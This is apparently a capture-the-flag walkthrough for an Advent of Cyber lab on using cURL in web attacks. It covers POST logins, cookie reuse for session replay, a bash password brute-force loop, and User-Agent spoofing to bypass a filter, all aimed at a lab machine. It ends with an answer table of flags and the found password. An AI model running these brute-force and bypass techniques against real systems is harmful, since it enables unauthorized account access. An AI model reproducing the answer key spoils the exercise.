# Advent of Cyber 2025 - Day 24 - Exploitation with cURL: Hoperation Eggsploit

## 1. Introduction

According to blue-team intel, the wormhole is held open by a control panel on the Evil Bunnies' web server. The team must shut it down first to cut off reinforcements before facing King Malhare.

However, the terminal they have is bare. No Burp Suite, no browser, just a command prompt.

But that's fine. The team will use the command line and cURL to speak HTTP directly: send requests, read responses, and find the endpoints that shut the portal.

<br></br>

### Learning Objectives
---

- Understand what HTTP requests and responses are at a high level.
- Use cURL to make basic requests (using GET) and view raw responses in the terminal.
- Send POST requests with cURL to submit data to endpoints.
- Work with cookies and sessions in cURL to maintain login state across requests.

<br></br>

### Connecting to the Machine
---

Start your target VM by clicking the Start Machine button below. The machine will need about 2 minutes to fully boot. Additionally, start your AttackBox by clicking the Start AttackBox button below. The AttackBox will start in split view. In case you can not see it, click the Show Split View button at the top of the page.

<br></br>

## 2. Web Hacking Using cURL

### HTTP Requests Using cURL
---

#### **Understanding HTTP**

HTTP (Hypertext Transfer Protocol) is how clients (like browsers) communicate with servers.
A client sends an **HTTP request**, and the server responds with an **HTTP response** containing status codes, headers, and data.

Browsers handle this transparently, but tools like **cURL** allow us to craft and send raw HTTP requests directly from the command line.

#### **What is cURL**

`curl` is a command-line tool used to:

* Send HTTP/HTTPS requests
* View raw server responses
* Interact with web applications without a browser

It is especially useful for:

* Web exploitation
* API testing
* Automation
* Bypassing client-side restrictions

<br></br>

### Trying Out cURL
---

#### **Basic GET Request**

```bash
curl http://MACHINE_IP/
```

**What happens:**

* cURL sends an HTTP **GET** request
* The server responds with HTML
* The raw HTML is printed in the terminal (no rendering)

<br></br>

### Sending POST Requests
---

#### **Basic POST Login Request**

```bash
curl -X POST -d "username=user&password=user" http://MACHINE_IP/post.php
```

**Explanation:**

* `-X POST` → Use POST method
* `-d` → Send data in the request body
* Data is URL-encoded (same as HTML forms)

Expected response:

```
Invalid credentials
```

#### **Including Extra Form Fields**

```bash
curl -X POST -d "username=user&password=user&submit=Login" http://MACHINE_IP/post.php
```

Some applications require extra parameters like submit buttons or CSRF tokens.

#### **Viewing Headers**

```bash
curl -i -X POST -d "username=user&password=user" http://MACHINE_IP/post.php
```

The `-i` flag shows:

* HTTP status code
* Response headers
* Cookies (Set-Cookie)

<br></br>

### Using Cookies and Sessions
---

#### **Step 1: Save Cookies**

```bash
curl -c cookies.txt -d "username=admin&password=admin" http://MACHINE_IP/session.php
```

* `-c cookies.txt` saves session cookies
* Typical cookie: `PHPSESSID`

#### **Step 2: Reuse Cookies**

```bash
curl -b cookies.txt http://MACHINE_IP/session.php
```

* `-b` sends stored cookies
* Mimics an authenticated browser session

This is the basis of **session replay attacks**.

<br></br>

### Automating Login & Brute Force with cURL
---

#### **Password List**

Create `passwords.txt`:

```
admin123
password
letmein
secretpass
secret
```

#### **Brute Force Script**

```bash
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://MACHINE_IP/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
```

#### **Run the Script**

```bash
chmod +x loop.sh
./loop.sh
```

**How it works:**

* Loops through passwords
* Sends POST requests
* Detects success via response difference
* Stops when valid password is found

This is the **core logic behind tools like Hydra and Burp Intruder**.

<br></br>

### Bypassing User-Agent Restrictions
---

#### **Custom User-Agent**

```bash
curl -A "internalcomputer" http://MACHINE_IP/ua_check.php
```

#### **Confirming the Filter**

```bash
curl -i http://MACHINE_IP/ua_check.php
curl -i -A "internalcomputer" http://MACHINE_IP/ua_check.php
```

If the first fails and the second succeeds, the User-Agent filter has been bypassed.

<br></br>

## **Answers**

| Question               | Answer                              |
| ---------------------- | ----------------------------------- |
| POST `/post.php` flag  | **THM{curl_post_success}**          |
| Cookie reuse flag      | **THM{session_cookie_master}**      |
| Admin password         | **secretpass**                      |
| User-Agent bypass flag | **THM{user_agent_filter_bypassed}** |

<br></br>

## **Conclusion**

* cURL allows direct interaction with HTTP
* POST requests, cookies, and headers can all be manipulated
* Authentication and brute forcing are just repeated HTTP requests
* User-Agent filtering is trivial to bypass
* Understanding raw HTTP gives full control over web attacks

---